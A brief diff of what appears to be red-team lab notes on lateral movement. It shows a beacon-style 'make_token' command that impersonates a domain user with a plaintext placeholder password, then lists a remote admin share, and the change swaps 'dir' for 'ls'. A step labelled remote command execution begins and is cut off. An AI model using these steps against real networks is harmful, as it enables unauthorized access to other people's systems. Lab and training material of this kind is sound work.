@@ -19,7 +19,7 @@ explanation:-
 
 ✅ 1. Access SMB shares
 make_token CONTOSO\rsteel Passw0rd!
-dir \\10.10.10.1\C$
+ls \\10.10.10.1\C$
 
 ✅ 2. Remote command execution
 make_token CONTOSO\rsteel Passw0rd!
